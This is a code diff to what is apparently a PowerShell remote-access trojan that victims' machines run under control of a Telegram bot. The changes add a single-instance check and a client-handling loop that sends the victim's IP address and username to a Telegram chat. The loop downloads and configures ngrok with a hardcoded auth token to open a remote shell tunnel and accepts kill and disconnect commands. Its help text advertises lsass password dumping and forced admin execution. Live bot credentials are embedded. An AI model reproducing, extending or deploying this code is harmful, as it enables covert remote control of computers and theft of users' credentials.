@@ -161,8 +161,10 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
         }
     }
 
+    run-once    
     $offset = First-offset $apiToken
     $foo = $offset
+    $specid = [string](Get-Random -Maximum 4000000000)
     while ($true)
     {
         try
@@ -267,6 +269,17 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
                 {
                     $output = get-MyHelp
                     Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                }
+                ElseIf(([string]$command.Trim()) -like "display spec id"){
+                    $imhim
+                    Send-data -data "$specid : $imhim" -chat_id $chat_id -apiToken $apiToken
+                }
+                ElseIf(([string]$command.Trim()) -like "kill -id $specid"){
+                    exit
+                }
+                ElseIf(([string]$command.Trim()) -like "Disconnect"){
+                    handle-client -apiToken $apiToken -chat_id $chat_id -update $null
+                    Send-data -data "session closed." -chat_id $chat_id -apiToken $apiToken
                 }
                 else{
                     $output = Excmd $command
@@ -513,7 +526,7 @@ function get-MyHelp
     "[+] get dump lsass file  Description:" 
     "Gather lsass passwords for all users" 
     "`n"
-    "[+] force run as admin -p <password>  "
+    "[+] force run as admin -p <password>"
     "Description: Run VBS script to forcelly run as admin with password (Ex. 'force run as admin -p 1234')"
     "`n"
     "[+] get dump lsass file " 
@@ -542,6 +555,88 @@ function get-MyHelp
     return $helhelp
 }
 
+function run-once
+{
+    try
+    {
+        $procid = Get-Content "$env:APPDATA\ProcessId.pid"
+        $testid = (Get-Process | Select-Object path | where Id -like $procid).Id
+        if ($testid -eq $null)
+        {
+            $currId = [System.Diagnostics.Process]::GetCurrentProcess().Id
+            echo $currId > "$env:APPDATA\ProcessId.pid"
+            return $null
+        }
+        else{
+            exit
+        }
+    }
+    catch
+    {
+        $currId = [System.Diagnostics.Process]::GetCurrentProcess().Id
+        echo $currId > "$env:APPDATA\ProcessId.pid"
+    }
+}
+
+
+function handle-client($apiToken,$chat_id,$update)
+{
+    if ($update -ne $null)
+    {
+        $curip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
+        Send-data -data "New connection`n$curip, $env:username" -chat_id $chat_id -apiToken $apiToken
+    }
+    $offset = First-offset $apiToken
+    $foo = $offset
+    while($true)
+    {
+        try
+        {   
+            $message = read-comm -apiToken $apiToken -offset $offset
+            $offset = $message[1]
+            if ($offset.contains(" "))
+            {
+                $offset = -split $offset
+                $offset = $offset[-1]
+            }
+
+            
+            if (-not($offset -eq $foo))
+            {
+                $foo=$offset
+                $command = $message[0]
+                if($message.contains("connected"))
+                {
+                    Send-data -data "$curip, $env:username" -chat_id $chat_id -apiToken $apiToken
+                }
+                ElseIf($message.contains("connect $curip, $env:username")){
+                    Set-Location C:\
+                    try
+                    {
+                        $path_to_ngrok = "C:\ngrok\ngrok.exe"
+                        if(([System.IO.File]::Exists($path_to_ngrok)) -eq $false)
+                        {
+                            mkdir C:\ngrok
+                            Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
+                            Expand-Archive C:\ngrok\ngrok.zip -Destination C:\ngrok
+                            ngrok config add-authtoken "29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR"
+                        }
+                        $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
+                    }
+                    catch{
+                        $err = 1
+                    }
+                    start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
+                }
+            }
+        }catch{
+            $errr = 1
+        }
+        Start-Sleep -Seconds 3
+    }
+}
+
+
 function savePassword-clearText
 {
     if ((is-administartor)-eq $false)
@@ -559,24 +654,9 @@ function savePassword-clearText
 }
 
 
-Set-Location C:\
-try
-{
-    $path_to_ngrok = "C:\ngrok\ngrok.exe"
-    if(([System.IO.File]::Exists($path_to_ngrok)) -eq $false)
-    {
-        mkdir C:\ngrok
-        Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
-        Expand-Archive C:\ngrok\ngrok.zip -Destination C:\ngrok
-        ngrok config add-authtoken "29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR"
-    }
-    $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
-}
-catch{
-    $err = 1
-}
 
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
-start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
+
+handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"
 
